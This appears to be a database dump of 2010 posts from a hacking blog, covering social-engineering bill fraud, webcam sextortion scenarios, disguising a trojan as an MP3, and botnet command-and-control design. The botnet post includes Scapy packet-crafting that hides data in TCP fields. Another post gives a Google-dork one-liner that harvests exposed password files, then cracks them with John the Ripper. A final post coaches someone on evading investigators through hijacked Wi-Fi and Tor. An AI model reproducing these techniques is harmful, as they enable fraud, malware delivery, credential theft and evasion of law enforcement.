lie to you in order to get you to bump up to their next package, because, really, whats the point of having TV without a DVR these days?  15 minutes of show, 45 minutes of commercials.  So, most people opt to spend the additional $20 to go with the next tier of service that DOES support a DVR.  Well, game on, bitches.  If you\'re going to try to scam and lie to me in order to suck more money out of me, I\'ll do it right back and I guarantee I\'ll be the victor.\n\nI wait until I get my first bill, which is actually $187 and I call Comcrap and get to the infamous \"Customer Retention Department\".  You might as well ignore everyone else until you get to this department.  The key words to get to this mystical land are:  \"I think I\'d like to cancel my account..\"  Or, you can simply ask \"Do you have a customer retention department?\"\n\nThe latter is a bit more bold, indicating that you\'ve been through this process before and know the ropes, which may make it more difficult to actually be forwarded to the department.  Also, if you make it unpleasant for the current person that you\'re working with, they\'ll be more than happy to forward you wherever you want to go, so long as it doesn\'t involve them continuing to have to deal with you.\n\nSo, I usually come across as very upset for some reason (in this case, my $187 bill, even though I downgraded my service and it should have been prorated).  I\'m straight to the point, and I\'m pissed.  I vent for a bit and then end with, \"You know what.. why don\'t I just cancel my service.. this is ridiculous\"  Response - \"One moment please, I\'ll forward you to our cancellation department\"  Also known as.... Customer Retention!  :-)\n\nNow, this is where you summon one of your more pleasant personalities.  Bitching at the people in customer retention will not work, so don\'t.  You need for them to feel as if they can help you.  Their job at the company is to *retain customers*.  Your job is to lead them to water.  In order for this to work, you have to give them a way to wind up being the winner;  Retain you.  Think about it this way.. if you sat in a call center and someone called you up and started bitching and yelling at you, would you want to give them a way to save money?  No, probably not.\n\nI start the conversation by discussing the obviously incorrect $187 bill (was it incorrect?  no, not really..)  She begins to explain that the tech came out on the 26th, which was <i>after</i> my billing cycle ended.  I say, \"the 26th?  no.. it couldn\'t have been the 26th.. I was out of town on the 26th.  Let me look at my calendar\" *clickity clickity click\"  \"My calendar says that it was scheduled for the 12th.. and I know that it was a Wednesday because he made me late for my bowling league\"  (No, I don\'t bowl.. but, she doesn\'t know that and I needed something to reference to make her believe that I knew what the date really was).\n\nShe responds with, \"That\'s odd.. didn\'t you cancel the one on the 12th?\"  \"Ohhh!  I remember now.. I called in to cancel that appointment but it was too late in the afternoon and he showed up before he got the message that it was canceled\"  \"Oh.. that makes sense then.. it\'s just coming up in the computer as being canceled.. I can fix that.. hold on\"\n\nPerfect.  ;-)\n\nShe comes back with, \"OK, so I adjusted your account.. it looks like the credit will be $24.98.. but I also found a reversed credit on your account for $21.82 that I reapplied\"  Sweet, just saved $50.\n\nI begin talking to her about my what my bills will begin to look like going forward, now that I\'m on the digital economy plan.  She lists off my services and gets to the DVR being $15.95\n\nWait a second...... \"The DVR?  I didn\'t think the DVR worked on the digital economy plan.. the tech took it when he came out to put on the filter.\"  ...long pause... \"Oh, you\'re right.. hold on\".  She must have looked up the plan and saw where it says that the DVR isn\'t supported.  Just saved another $15.95.  I don\'t want to consider this to be a lie, really.  Lets consider it, a \"Reverse engineering of a lie\", because honestly, I just used the lie that they told me back against them.  If it wasn\'t in their documentation to tell customers that the DVR doesn\'t work on the economy plan, I wouldn\'t have been able to reference it, right?  :-)\n\n\"Ok, with the DVR taken off, your total monthly bill will be about $116, with tax\"  Still not good enough.  I\'m looking for sub $100.  My response: \"Hrm.. that\'s still more than I want to pay.. I\'m taking the family on vacation at the end of July and we don\'t really use the internet and TV that much during the summer.. maybe I should just cancel it\"\n\nNote:  Family vacations = $$$$.. everyone knows that.  She can probably identify with the not watching tv much during the summer, because with most families having sports, vacations, bbq\'s, etc etc etc.. it\'s a lot different than during the winter when you\'re trapped inside because it\'s -92F.  Now she can identify with my position and sympathize with it.  This also leads her to believe that even though I don\'t WANT to cancel, I\'m willing to because vacation > cable every day of the week.\n\nI ask, \"Are there any promotions available right now?\"  Something to note, there are ALWAYS promotions available.  And, in the customer retention department, they apparently have the ability to put you on a promotion that is available only to \"new customers\".  ;-)\n\n..pause..clickityclick.. \"Actually, there are a few promotions that I could set you up with right now.. and it looks like I can apply them to your previous bill as well..\"\n\nScore!... \"oh?\"\n\n\"There\'s a promotion for 50% off of your internet for 6 months.. and another for 50% off of your television service for 6 months..\"\n\nScore x2!... \"Awesome!  That sounds great!  So, how much would my bill be every month??\"\n\n..clickityclickclick..\n\n\"It looks like it will be around $51 after tax..\"\n\nScore x3!  So, lets get this straight.  I have virtually the same service as I had prior to \"downgrading\", for $136 less every month?\n\n\"Wow!!  Thank you so much!  That\'s perfect!\"\n\nShe felt like she did a good job (which she did) and retained me as a customer and made me very happy.. and I\'m saving about $140 a month.  Everyone\'s a winner.. ;-)\n\nHonestly, though, I hate lying.  But if a company is going to lie to me, or at least try to hide the truth in order to get me to pay more, I\'ll take off the gloves and get over my moral convictions and fight on the same level.\n\nA couple things to keep in mind when doing something like this.\n\n1) If you\'re not good at bluffing or get uncomfortable or nervous when trying to, this is not for you.  This involves a lot of bluffing and they need to believe that you\'re willing to cancel your service during this call.\n\n2) If you\'re really not willing to cancel service, but you hit a brick wall with the person you\'re talking to, you have to have an out.  If you hear \"Well, there\'s nothing I can do\".. this is your cue to bail.  \"Hmm.. well.. I\'m going to run it by my wife (girlfriend, grandma, dog, whomever).  How much would it be if I just kept <insert service here>\"  This leads them to believe that you\'re going to talk with someone else who uses these services before you cut the cord.  By ending with a question like that one, it indicates that maybe I don\'t want to cancel ALL of my services.. which is why I need to check with the Mrs\'s.  This covers the bluff.\n\n3) Realize when you\'ve hit a wall and be willing to try again on a different day.  These are people that we\'re dealing with.. people have bad days.  If you encounter someone who\'s having a bad day, retreat and find someone new to deal with.  You should be able to tell from their personality, expressions, and demeanor what mood they\'re in.  If they start out firm, they\'re only going to get more firm with their decision as you complain.  Also, if they don\'t seem to care that they lose you as a customer, consider it game over.\n\n4) If you know more about their services than they do, they\'ll immediately build a trust with what you\'re saying.  So, in this case, first I pointed out a service that the rep didn\'t know exists.  The next rep I pointed out that the DVR doesn\'t work on the plan that I switched to, something she didn\'t know.\n\n5) Try not to be overly social.  They sit on the phone all day with people, they probably don\'t want to hear you talk.  That said, asking them to talk about themselves, which they probably never get to do, might help tremendously.  It totally depends on the person.  If you ask a question about the weather where the rep is located and you get a one word answer, guess what?  He/she doesn\'t want to make small talk and is more interested in just getting you off the phone.  However, if the rep opens up and gives a detailed description about how it\'s \"finally nice outside after a week of crappy weather!\", well, then she wants to talk.  So let her.. if you come across as someone who\'s willing (and interested) in what she\'s talking about, this can really help when it comes to asking her for stuff.  Also, this works much better on women than men.\n\n6) Kind of continuing with #5.. don\'t be too flirty!  Again, this kind of is based on a case by case basis, but women will generally view you as a douche if you\'re too flirty, or if they immediately know that you\'re being flirty.  However, if you\'re really good at flirting and the rep is left with wondering if you were actually flirting with her or not, then, flirt away!  Just know that this can be risky.  Again, it comes down to really just figuring out the mood of the rep that you\'re dealing with.\n\n7) If the rep does something for you, be overly thankful.  Make him/her feel like they\'re the smartest and most competent rep you\'ve dealt with and that you wish all the reps were just like them.  An ego boost is like a drug.. give them a taste and they\'ll want more, which leads to them trying to find other ways to benefit you.  :-)\n\n8 ) Practice makes perfect.  I\'ve been doing this stuff since I was a kid.  I used to call up shops and barter and bargain with the sales people to try to get what I wanted for less than what they were asking.  Skateboards, rc cars, whatever.  Half of the fun of shopping was the calling around to try to manipulate someone into giving me something for less.  So, go through your bills and call each company and see if they have some hidden plan that could save you money.  It can be a lot of fun and rewarding, especially if you\'re able to greatly reduce a bill.\n\nAnyway, what say you?  Any tips you\'d like to share with me?  Let me hear \'em!  :-)\n\n\n\n','','2010-06-21 13:50:40','2010-06-21 18:50:40','','','2010-06-21 13:50:40','2010-06-21 18:50:40','reduce-your-bills-through-the-use-of-social-engineering','0','','publish','Reduce your bills through the use of Social Engineering.','post','');

He is charged with extortion, a felony offense that carries a statutory maximum penalty of two years in federal prison. The arrest follows a six-month investigation by the FBI and Glendale police into Mijangos\' involvement in computer hacking, identity theft and video voyeurism.\n</blockquote>\n\n<!--more-->\n\n(View the whole story here: <a href=\"http://www.ocregister.com/news/mijangos-254531-victims-affidavit.html\" rel=\"nofollow\">http://www.ocregister.com/news/mijangos-254531-victims-affidavit.html</a>)\n\nThis is an interesting twist on some of the stuff that I\'ve been talking about on here (specifically, the <a href=\"http://www.attackvector.org/invasion-of-privacy-the-sequel/\">Invasion of Privacy.  The Sequel</a>).\n\nWe\'ve already been encountering an enormous increase in the amount of identity theft cases taking place on the internet these days and now we have \"hackers\" using this information to manipulate people.\n\nThis weekend I was discussing the concept of this, but using a different scenario.  My scenario was, hackers targeting specific people, capturing data, and using the information to extort money.  I mean, people have this misconception that they\'re safe on the internet and that everything is private.  So, people tend to do things on the internet that they wouldn\'t do in real life.\n\nExample.  Bill Gates is probably not going to be found in a strip club.  However, I would venture to guess that no less than 50% of his awake hours are spent surfing adult websites.  If I were able to collect his private information, along with his browsing habits, I would have a significant amount of power over him, because releasing the fact that 6 hours of his work day is spent at \"ServerRoomBondageGirls.com\" would humiliate him to no end and to avoid that humiliation, I\'m sure he\'d be willing to pay up.\n\nWell, take that a step further and bring Tia Target back.\n\n<center><img src=\"http://www.attackvector.org/files/tia.jpg\"></center>\n\nLets say I\'ve been monitoring her for a few days and I\'ve managed to get some revealing pictures of her via her web cam.. I\'ve also gotten private information about her.. and I\'ve found out that she\'s kind of going back and forth between two different guys that don\'t know about each other.\n\nNow, lets say that I contact her via taking over her computer and opening up Notepad and begin typing to her, watching and listening to her through her web cam.  I inform her of the information that I have, along with the pictures and I give her an option.. either become my sex toy, or I\'m releasing all of this information, including pictures, to the internet.  And, because I know what school she goes to, I can forward the naked pictures that I\'ve collected to all of her classmates.\n\nSeriously ponder this for a minute and imagine what you\'d be feeling if you were put into that situation.  Yes, it\'s sick, it\'s twisted, but possible (and, apparently, currently being used).  What you face is losing your boyfriend(s), having your identity stolen, having money stolen, and being publicly humiliated because the entire football team has a naked picture of you taped up in their lockers.\n\nBlackmail and extortion is a very, very powerful thing and all it requires is information.  One tiny leak of information that you want to keep private immediately opens you up to attack and I think that it\'s only a matter of time before we begin hearing about more and more attacks like this one.  It\'s a serious issue that I don\'t think many people are taking as seriously as they should.  I often hear \"Haha.. they can have my identity, I don\'t want it anymore.\"  \n\nWell, it may not just be your identity that they\'re interested in.\n','','2010-06-23 12:16:38','2010-06-23 17:16:38','','','2010-06-23 12:16:38','2010-06-23 17:16:38','spyware-hacking-sexual-exploitation','0','','publish','Spyware, Hacking, & Sexual Exploitation','post',''),(

It\'s a series of YouTube videos of Kevin Mitnick doing a speech at a conference.\n\nIf you don\'t know who Kevin Mitnick is (really??), he was arguably the person who put hacking on the map.  I realize that he wasn\'t solely responsible for this, but his story made headlines over and over during his \"career\".  \n\nHe was chased by the FBI (and Tsutomu Shimomura.. booo) and eventually brought to justice.  Once arrested, he was held, without trial, in solitary confinement, for an absurd amount of time.  The reason?  Everyone was worried about him starting World War III by whistling into a phone.\n<!--more-->\nRead more about him <a href=\"http://en.wikipedia.org/wiki/Kevin_mitnick\" rel=\"nofollow\">here</a> (and ignore his arm being around Adrian Lamo.. ugh)\n\nAlso, there were a couple of books written that cover his chase.  The first one is:\n\n<a href=\"http://astore.amazon.com/attavect-20/detail/0786889136\"><img src=\"http://ecx.images-amazon.com/images/I/7141BZT6S3L._SL210_.gif\"><br>Takedown</a>, which is written by Tsutomu Shimomura and John Jerkof...Markoff.  I really, really liked this book, even if I don\'t like the people who wrote it.  It\'s a story of a hacker tracking down another hacker, which is pretty awesome.\n\nThe other one is:\n\n<a href=\"http://astore.amazon.com/attavect-20/detail/0316528692\"><img src=\"http://ecx.images-amazon.com/images/I/51H0Q44RWCL._SL210_.jpg\"><br>The Fugitive Game</a>, which is written by Jonathan Littman, who is the guy that Mitnick kept in touch with while he was fleeing the feds.  So, if you read both books, you get a really good understanding of what was going through their heads, the techniques used, and the whole story.  I recommend both of them.\n\nAnyway!

Mijangos induced victims to download the malware onto their computers by making the files appear to be popular songs, according to the affidavit.\n</blockquote>\n\nI immediately thought, \"Fricken idiots.  Didn\'t you notice the .exe instead of the .mp3???\"\n<!--more-->\nThen it dawned on me.  Maybe it\'s not (entirely) their fault.  This may actually be Windows fault (go figure).  I\'ll admit that I do whatever I can to blame Windows & Microsoft for all of the problems in the world, but this one may be legitimately their fault!  Honest!  :-)\n\nFirst, every version of Windows that I\'ve ever touched has this option set, by default, right out of the box:\n\n<center><img src=\"http://www.attackvector.org/files/hidext.jpg\"></center>\n\nSo, lets assume for a moment that this was checked and that the extension wasn\'t actually visible to the end user.\n\n\"But what about the icon?  They should know the difference between what an icon for an exe looks like an an mp3 looks like\"\n\nFair... unless Mijangos changed the icon.\n\nThere are a lots of programs floating around the internet that will allow you to easily change the icon for an executable.  I don\'t run Windows, but I have a vmware image of XP that I use for this purpose.  I use a piece of software called \"Icon Changer\" from <a href=\"http://www.shelllabs.com\" rel=\"nofollow\">Shell Labs</a>.\n\nI\'ll use a trojan I made as an example.  This is probably an identical trojan to what Mijanos used, but, undoubtedly, mine is better.  ;-)\n\nAnyway, here\'s the trojan before manipulating it in any way.\n\n<center><img src=\"http://www.attackvector.org/files/bestsong.png\"></center>\n\nNow, this part would require some guess work (or research).. but, lets say that I know the person that I\'m attacking uses Winamp to play their MP3\'s...\n\nRight click on the file and:\n\n<center><img src=\"http://www.attackvector.org/files/changeicon.png\"></center>\n\nFind the icon that you want to use and then click \"Set\" and you\'ll see:\n\n<center><img src=\"http://www.attackvector.org/files/2ways.png\"></center>\n\nChoose the first, because you want the icon to remain even if the exe is sent to another box.\n\nNow we have something that looks like this:\n\n<center><img src=\"http://www.attackvector.org/files/bestsong2.png\"></center>\n\nNow I turn on the \"Hide file extensions for known file types\" and we have:\n\n<center><img src=\"http://www.attackvector.org/files/bestsong3.png\"></center>\n\nPretty convincing, if you ask me.  To be entirely honest, I think most people would click on that if it found its way into your MP3 directory and had a real name of a song.\n\nThis is a quite effective method for attacking targets.  There are, however, some caveats.  The biggest one being the whole antivirus thing.  If the end user is using an up to date antivirus and you\'re not using a packer with 0day stubs, it\'s probably going to be detected.\n\n','','2010-06-23 14:24:49','2010-06-23 19:24:49','','','2010-06-23 14:24:49','2010-06-23 19:24:49','convincing-end-users-that-black-is-white','0','','publish','Convincing End Users That Black is White','post',''),(

Here\'s the video:\n<!--more-->\n<center><embed height=\"400\" width=\"600\" src=\"http://videos.revision3.com/revision3/web/hak5/0701/hak5--0701--snubs-sugar--large.h264.mp4\"></center>\n\nLet me start out by saying that I respect Robin and have used some stuff that he\'s released.  That said, I have some serious issues with the idea of using a social networking platform to control a botnet, for a multitude of reasons.\n\nI think probably the biggest reason would be that there would be a pretty cut and dry trail of what the bots are doing.  This would make it easy for the feds to watch, monitor, and when you get caught, use against you.  Kind of hard to deny it when they have all of the tweets.  Unlike IRC, which would only be logged if someone is in the channel with logging turned on.  Also, using a mechanism that changes the channel key based on the current time will eliminate (for the most part) prying eyes.  \n\nSecondly, too easily blocked.  This is going to be a common problem regardless of the method.  Since the bots require commands, which is in a specific format, it\'s pretty simple to get the command list and block tweets (or packets) that contain the commands.\n\nThird, while I appreciate the creativity and thinking outside of the box, I can think of many other methods that would be better suited for this purpose.\n\nIn the video, he mentions that someone used the header of an image file to send commands back and forth between bots.  To me, this is a far better and more stealthy way of doing things.  Al-Qaeda supposedly used this method at one point to send messages back and forth.  Pedophiles have also used this for quite some time.  It\'s effective and, with the right image, never detected.\n\nThe biggest problem that bot designers face is that in order for the bots to communicate, they have to know where to go to look for the commands.  This means that in any scenario, there\'s always a central location.. and because of that, they\'re (relatively) easy to shut down.  Kill the channel, kill the website, kill the domain, kill the box, kill the.. something, and the control is lost and the bot net is left idle.\n\nConficker (rev. C) is definitely the best example of C&C that we\'ve seen thus far.  It randomly generated domain names that it used to send and receive commands.  Only using a specific domain name for a certain amount of time before it moved on to the next one, so even if a registrar shut down the domain currently in use, in a short amount of time it would generate a new one.\n\n<blockquote>\n<b>Domain Generation Algorithm</b>\n\nThe domain generation algorithm and query procedure (Figure 2) have been significantly modified from previous versions of Conficker.  Among the potential motivations for these changes may be to address the recent actions of the Conficker Cabal, as it has moved to block future registrations of Conficker A and B domains.  Among the key changes, Conficker C increases the number of daily domain names generated, from 250 to 50,000 potential Internet rendezvous points.    Of these 50,000 domains, only 500 are queried, and unlike previous versions, they are queried only once per day.  \nFurthermore, C provides significantly more filtering of the IP addresses produced by the DNS queries.  The IP address is rejected if it was associated with a query that returned more than one IP address \nit is 127.0.0.1 (localhost) or other trivial address it matches an address with an internal blacklist (see Appendix 2 for the full blacklist) another DNS query had previously returned the identical IP.   Note, if an organization chooses to register and resolve multiple Conficker C domains to a single IP address, C-infected machines will not contact that IP more than one time.  If none of the domains are alive and ready to serve a digitally signed payload,  C will sleep for 24 hours, and then will generate a new list of 50,000 domains.    The algorithm produces a domain name set that is independent of Conficker A and B, and will overlap these other domain sets only in a rare coincidence.    The name of each generated domain is 4 to 10 characters, to which a randomly selected  TLD is appended from the following list of 116 suffix (mapping to 110 TLDs):\n</blockquote>\n\n(Quoted from: <a href=\"http://mtc.sri.com/Conficker/addendumC/\" rel=\"nofollow\" target=\"_blank\">http://mtc.sri.com/Conficker/addendumC/</a>)\n\nWhile I think the idea of \"hiding in plain sight\" is probably the best method these days, I don\'t think using something like Twitter (or Facebook, or Linkedin, or MySpace, or Craigslist (yes, Craigslist could be easily used) etc etc etc) is the answer.  Whatever method is used, it needs to provide the following:\n\n1) Not logged, stored, and indexed by Google\n2) Incredibly dynamic.  Again, think Conficker\n3) Secure - hard to fingerprint C&C packets if they\'re encrypted\n4) Fast\n\nThat should help narrow down possible methods.  Some to think about:\n\nAIM, Skype, MSN, Yahoo Chat, ICQ, etc. which all do a pretty good job at communicating through firewalls, they\'re \"private\" (ie - your communications aren\'t plastered to some website for the world to see), and they\'re real time.  The problem, though, is that it\'s not very dynamic.  Once someone disassembles the worm, they\'ll see how it operates and will know where to go to intercept.\n\nSo, you may be asking.. what is the best method, then?\n\nWell, here\'s my theory of what the perfect botnet would look like.  The bots would communicate with each other, without the use of an outside service.  The worm would propagate and with each successful infection, it would send a \"ping\" (ping - some kind of packet carrying some kind of data) back to it\'s original host, indicating that it had a successful infection.  The original host would then ping back with the list of infected hosts that it knows exist.  This way, each bot has it\'s own list and there is no central server.  It would be a lot like P2P, except that there would be no *1* tracker.\n\nFor sending commands.. because of the way that this would be set up, the attacker could connect to any node (call it Node 0) and issue a command, which would then be broadcast to every node that Node 0 has in it\'s list.  When Node 1 receives the command, it would then look at it\'s known list of infected hosts and reissue the command.  No, it wouldn\'t be blazing fast, but it would work quite well and the benefits that would come from this method would certainly outweigh the performance issue.\n\nThe bot designer would face a few hurdles, though.  The bots would need to communicate over a port that couldn\'t be simply firewalled by ISP\'s.  *cough*25,53,80,110,443*cough*  How would I do it, you ask?  I would create an array of ports and each bot would randomly choose a port from the array, so there\'s no standard.  As part of the pingback to the infecting host, it would include the port number that the new offspring has chosen.  \n\nAnother hurdle using this method is that most people have home routers that are using NAT and if the bot resides on 10.0.0.5:80, the router would have to know to forward incoming traffic to port 80 to that IP.  This could be overcome (kind of) by UPnP, since most home routers come with UPnP enabled.\n\nOne of the biggest problems that I\'ve seen in bot design is that they\'ll use some random port that really stands out and is super easy to throw into an ACL at the border of an ISP.. Example.. port 31337, or 1337.  I mean, really?  Nothing but backdoors and trojans use that port and it takes about 30 seconds to write a rule to block it.  Things become much, much more difficult, however, once you have a list of, say, 1000 of the most used legitimate ports (web, mail, etc) and utilize those, randomly, from bot to bot.  No longer could an admin just willy-nilly firewall a port.\n\nOk, so that handles the networking bit.. what about the actual communications between bots?  The problem you\'d face is that lets say your bots are sending commands back and forth, over all of these random ports, that look like \"cmd: synflood 1.2.3.4 500\".  Well, there\'d be a new IDS rule within seconds of discovery.. which would then lead to detection of the infected hosts and firewalling them.  This does not make for a good botnet.\n\nSo, lets think about this.. we need a way for the bots to communicate, which would make it difficult to write an IDS rule for.  We\'re really limited here, actually.  We need to use a protocol that\'s common and essential to the livelihood of the internet.  This immediately rules out ICMP, which is unfortunate because simply encrypting a command and dropping it into the payload of an ICMP packet would work great for the most part.  It would be hard to differentiate between random data and encrypted data.\n\nWe\'re really left with TCP and UDP.  In order to transfer data via TCP, there needs to be a full connection, which means it\'s going to be slow.  You could, however, use a series of crafted packets using different offsets, sequence numbers, etc. using the TCP protocol.\n\nExample:\n\nFirst packet has the SYN bit enabled and the sequence number is the IP address of the victim.. using Scapy:\n\n<blockquote>\n>>> packet=IP(src=\"1.2.3.133\",dst=\"1.2.3.132\")/TCP(sport=80,dport=80,flags=\"S\",seq=127001)\n>>> s=sr1(packet)\n</blockquote>\n\n<blockquote>\n11:06:04.124439 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40) 1.2.3.133.80 > 1.2.3.132.80: S, cksum 0x8a3e (correct), 127001:127001(0) win 8192\n</blockquote>\n\nOr, maybe a better way would be to have, say:\n\nSYN = first octect\nRST = second\nPSH = third\nACK = fourth\n\nExample:\n\n<blockquote>\n>>> packet=IP(src=\"1.2.3.133\",dst=\"1.2.3.132\")/TCP(sport=80,dport=80,flags=\"S\",seq=1)\n11:14:33.013806 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40) 1.2.3.133.80 > 1.2.3.132.80: S, cksum 0x7a4f (correct), 1:1(0) win 8192\n\n>>> packet=IP(src=\"1.2.3.133\",dst=\"1.2.3.132\")/TCP(sport=80,dport=80,flags=\"R\",seq=2)\n11:15:37.654257 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40) 1.2.3.133.80 > 1.2.3.132.80: R, cksum 0x7a55 (correct), 2:2(0) win 8192\n\n>>> packet=IP(src=\"1.2.3.133\",dst=\"1.2.3.132\")/TCP(sport=80,dport=80,flags=\"P\",seq=3)\n11:16:11.210867 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40) 1.2.3.133.80 > 1.2.3.132.80: P, cksum 0x7a50 (correct), 3:3(0) win 8192\n\n>>> packet=IP(src=\"1.2.3.133\",dst=\"1.2.3.132\")/TCP(sport=80,dport=80,flags=\"A\",seq=123)\n11:16:46.163235 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40) 1.2.3.133.80 > 1.2.3.132.80: ., cksum 0x79d0 (correct), 123:123(0) ack 0 win 8192\n</blockquote>\n\nSo, the IP address is \"1.2.3.123\".  Commands could be put into the offset, or window, or options field.  This is overly simplified, but a PoC could easily be created using this method of communication.\n\nHOWEVER.  Because these packets would definitely be unique (the highest sequence number would be 255), it would be pretty easy to fingerprint using IDS.  What we need to do is have our traffic blend in to other traffic, making it difficult to block without affecting other legitimate traffic.\n\nI could sit here and brainstorm all day long about theoretical C&C methods.. but, ultimately, my point is that using a service controlled by someone else (ie - Twitter) is not a very good idea.\n\nI\'d like to hear some of your thoughts on this topic.  Really think outside of the box, though.\n\n\n\n','','2010-06-25 11:36:08','2010-06-25 16:36:08','','','2010-06-25 11:36:08','2010-06-25 16:36:08','botnet-command-and-control-methods','0','','publish','Botnet Command and Control Methods','post','');

I hear a lot of whining from people when I tell them that their password is weak, or they tell me \"eh, I don\'t care if they get my password\".  Really?\n\nThe original post, \"How I\'d Hack Your Weak Passwords\" was written by John Pozadzides at \"<a href=\"http://onemansblog.com/2007/03/26/how-id-hack-your-weak-passwords/\" rel=\"nofollow\" target=\"_blank\">One Man\'s Blog</a>\".  I would suggest reading it, because I\'m not going to reinvent the wheel, just show others how the wheel works.\n<!--more-->\nI\'ve touched on the topic of cracking passwords, but I haven\'t really gone into any great detail on it.  So, that\'s what I\'m going to do here.  I want to actually show people how long it really takes to crack a weak password.  This could be your password to Facebook, Twitter, your email, your bank, your credit card company, whatever.  This will also apply to companies who have not instituted a strict password policy and maybe this will help to convince them to do so.\n\nIn his article, John talks about the readily available password crackers.  My favorite, as I\'ve mentioned, is John the Ripper.  Very fast, very effective.  It\'s centuries old (ok, maybe not centuries, but 15 years on the internet IS centuries) and there have not been, to my knowledge, any other crackers released that have ever come close to JTR.  This tells me that it was done right the first time.  How often does that happen?\n\nAnyway, I\'m going to use a list of passwords that I\'ve found.. *cough*\n\n<blockquote>\nlynx -dump \"http://www.google.com/search?q=inurl:(service|authors|administrators|users)+ext:pwd+%22%23+-FrontPage-%22&hl=en&num=500&sa=N\"|perl -le \'while(<STDIN>){if(/^.*?#.*?Page.*?s+(.*?:.*?)..*/) { print $1; }}\' >> passwords.txt\n</blockquote>\n\n*cough*....\n\nAnywho.. I have a list of 30 usernames and encrypted passwords.  This will represent the password list of a small company.\n\n<blockquote>\npurchas:MHEcGWKkOq1B2\nchapan1:kDMyyutUNFBIs \ndan:BPp5Xv7z1kpfA\n</blockquote>\n\nSo, earlier in the month I posted my gigantic <a href=\"http://www.attackvector.org/files/thelist.txt.bz2\">wordlist</a> in my \"<a href=\"http://www.attackvector.org/brute-force-with-thc-hydra/\">Brute Force with THC Hydra</a>\" post.  We\'re going to start by using this list to quickly crack the weakest of the weak passwords in this list.\n\n<blockquote>\n# john -wordfile:thelist.txt service.pwd\nLoaded 30 passwords with 30 different salts (Standard DES [48/64 4K])\nvoyager1         (epaaw)\nsabrina0         (harmony)\nTheresa1         (randy)\nbugeye20         (crowcreek)\n14damone         (themother)\nelmarko1         (rondieck)\ndesign           (royal)\ndevries1         (a-iba)\nfamilyle         (jonathan)\ndramquee         (badbreath)\nstargell         (kingbros)\nbisaccia         (bright)\nguesses: 12  time: 0:00:26:20 100%  c/s: 241196  trying: Eric143 - millan12\n</blockquote>\n\n12 passwords in 26 minutes, so it took about 2 minutes to crack each password.  Notice whats common among all of those.. they\'re all lower case, about 8 characters, and contain some numbers.  But, the real key to these passwords, is that the characters that are in the password form a word.  \"family\", \"design\", \"voyager\".. that\'s what made these so easy to crack.  Do your passwords look anything like this?\n\nNow we will switch over to incremental mode.  This is a slower process, but, technically, more effective.\n\nWhile we wait, I\'ve stolen this table from \"<a href=\"http://onemansblog.com/2007/03/26/how-id-hack-your-weak-passwords/\" rel=\"nofollow\" target=\"_blank\">One Man\'s Blog</a>\" that is eye opening.\n\n<center><img src=\"http://www.attackvector.org/files/table.png\"></center>\n\nLook at the line for 8 character passwords.  2.42 days for passwords which are only lower case, and 2.10 centuries for passwords that use all characters (mixed case, numbers, etc).  Bump it up to 9 characters, and you have a rock solid password.  This table assumes that the letters are random and not using dictionary words, though.\n\nSo, I let John run over the weekend and here are the additional ones that the incremental mode found:\n\n<blockquote>\nLoaded 18 passwords with 18 different salts (Standard DES [48/64 4K])\n21062            (nobody)\njabber69        (mandy)\ncoolioz           (louisiana)\nguesses: 1  time: 2:19:36:27  c/s: 240996  trying: lobboac1 - letdlorb\n</blockquote>\n\nNot as successful as I would have hoped, but.. if this was the password file for a company, I now have credentials for half of their employees.\n\nAnyway, because of the awesome article that John wrote, plus the multitude of other articles regarding the use of John, I\'m going to keep this short and sweet.  The moral of the story is:  Use strong passwords, or don\'t piss and moan when you get owned.  We\'ve told you, many times, and you couldn\'t be inconvenienced by using a more complex password.\n\nIf you want to use stronger passwords, check out my post <a href=\"http://www.attackvector.org/perl-password-generator/\">Perl Password Generator</a>.\n\n','','2010-06-28 11:47:13','2010-06-28 16:47:13','','','2010-06-28 11:47:13','2010-06-28 16:47:13','how-your-passwords-get-hacked','0','','publish','How your passwords get hacked.','post',''),(

I want to talk about where this guy went wrong, because I think one of the major threats we face right now is the fact that it can be made to be impossible to track someone down on the internet, but this guy obviously failed miserably.\n\nFirst, he used his neighbors Wi-Fi.  This is an issue for a few reasons.  Obviously when you threaten the (vice) president, they\'re going to investigate.  Part of this investigation, I\'m sure, is questioning neighbors, friends, and family.  So, it was inevitable that a fed would eventually wind up on his doorstep.\n\nSecond, he decided to use his neighbors identity.  Sure, this would be funny if you were to sign up for a porn mailing list, or something for erectile dysfunction, but to do this when threatening a public official, is idiotic.  I mean, obviously it\'s not funny to try to get someone else in this level of trouble, even if you do hate them for whatever reason, but you\'ve now narrowed the search area by a lot.  Why?  The feds are eventually going to conclude that this was done using his Wi-Fi, which leaves a relatively small area for the perpetrator to be located.\n\nThird, it is trivial to triangulate on a Wi-Fi signal, so finding the signal of someone who\'s using your Wi-Fi is a simple process.\n\nFourth, child porn is no joke.  It\'s a quick, quick way to get locked up, even if the other charges get dropped.  I mean, putting all of the moral and ethical issues surrounding child porn aside, simply having it on your computer is a quick ticket to the slammer.  Dumb.\n\nSo, how could he have successfully pulled this off?  Really easily, actually.\n\n1) Take a drive.  Using a wireless network right next door to you is idiotic.  You\'re, what, 15 feet away from your neighbor?  You don\'t think they\'re going to check your place if they find out that the middle man (your neighbor) has a wireless network?  Think again.  \"But I spoof my mac address and I\'m uberleet\".  Good luck, dude.  When they confiscate your computer and find \"macspoof\", they\'re going to put 2 and 2 together.\n\nSo, drive X amount of miles from your house and THEN use a wireless network.  They\'re everywhere, I\'m sure you\'ll find one.\n\n2) The idea of using the wireless network as the anonymizer is pretty dumb, because they (the feds, police, the people that throw you in prison) will still know your approximate physical location.  And, since these guys get paid to do ask questions and investigate stuff, they have all day, every day to track you down.  And I guarantee, if you park in front of someones house for a few hours, people are going to notice.  Think about it.. if someone was sitting outside of your house, parked, with a laptop at 2am, wouldn\'t you take notice?  Maybe make a mental note of the make, model, color of the car and a vague description of the occupant?  I would.\n\nUse a fricken proxy, people.  Sure, drive your car out to suburbia, find a wireless network, pwn it, use it.. but before sending death threats to presidents and whatnot, TURN ON TOR!  OR SOMETHING!  Geez.  By using proxies, you gain an additional level of anonymity, because now your anonymizer is being anonymized.  So, if, by some chance, the Tor operator in Germany is logging and hands them over to the feds, it\'ll still only lead back to the wireless network that you used, which is not your neighbors.\n\nAlso, if you were to use a different wireless network every time you did whatever it was that you were doing, it would make the job of tracking you down significantly more difficult. 